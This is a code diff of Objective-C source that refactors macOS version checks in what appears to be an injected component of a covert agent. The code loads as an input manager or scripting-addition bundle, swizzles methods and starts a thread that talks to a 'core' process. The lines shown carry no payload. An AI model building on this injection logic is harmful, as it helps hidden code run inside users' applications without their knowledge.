@@ -380,7 +380,14 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                                    name: NSApplicationWillTerminateNotification
                                                  object: nil];
       */
-      if (gOSMajor == 10 && gOSMinor == 6)
+      if ([gUtil isLeopard]) 
+        {
+          [[NSNotificationCenter defaultCenter] addObserver: self
+                                                   selector: @selector(startThreadCommunicator:)
+                                                       name: NSApplicationWillFinishLaunchingNotification
+                                                     object: nil];
+        }
+      else
         {
 #ifdef DEBUG_INPUT_MANAGER
           verboseLog(@"running osax bundle");
@@ -388,14 +395,6 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                    toTarget: self
                                  withObject: nil];
-        }
-      else 
-        {
-      
-          [[NSNotificationCenter defaultCenter] addObserver: self
-                                                   selector: @selector(startThreadCommunicator:)
-                                                       name: NSApplicationWillFinishLaunchingNotification
-                                                     object: nil];
         }
     
       [[NSNotificationCenter defaultCenter] addObserver: self
@@ -419,7 +418,14 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 #endif
         }
       
-      if (gOSMajor == 10 && gOSMinor == 6)
+      if ([gUtil isLeopard]) 
+        {
+          [[NSNotificationCenter defaultCenter] addObserver: self
+                                                   selector: @selector(startThreadCommunicator:)
+                                                       name: NSApplicationWillFinishLaunchingNotification
+                                                     object: nil];
+        }
+      else
         {
 #ifdef DEBUG_INPUT_MANAGER
           verboseLog(@"running osax bundle");
@@ -427,13 +433,6 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                    toTarget: self
                                  withObject: nil];
-        }
-      else 
-        {
-          [[NSNotificationCenter defaultCenter] addObserver: self
-                                                   selector: @selector(startThreadCommunicator:)
-                                                       name: NSApplicationWillFinishLaunchingNotification
-                                                     object: nil];
         }
       
       [[NSNotificationCenter defaultCenter] addObserver: self
@@ -831,7 +830,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   
   // On leopard we get pid on shmem
   // waiting till core write it...
-  if (gOSMajor == 10 && gOSMinor == 5)
+  if ([gUtil isLeopard])
     {
       while (TRUE)
         {
@@ -971,16 +970,17 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
   
   usleep(500000);
 
-  // Only for input manager
-  if (gOSMajor    == 10 &&
-      gOSMinor == 5 &&
-      [self isACrisisApp])
-  {
+  // Only for leopard
+  if ([gUtil isLeopard])
+    {
+      if ([self isACrisisApp])
+        {
 #ifdef DEBUG_INPUT_MANAGER
-    infoLog(@"Crisis is started and app match exit now!");  
+          infoLog(@"Crisis is started and app match exit now!");  
 #endif
-    return;
-  }
+          return;
+        }
+    }
   
 #ifdef DEBUG_INPUT_MANAGER
   infoLog(@"Core Communicator thread launched");  
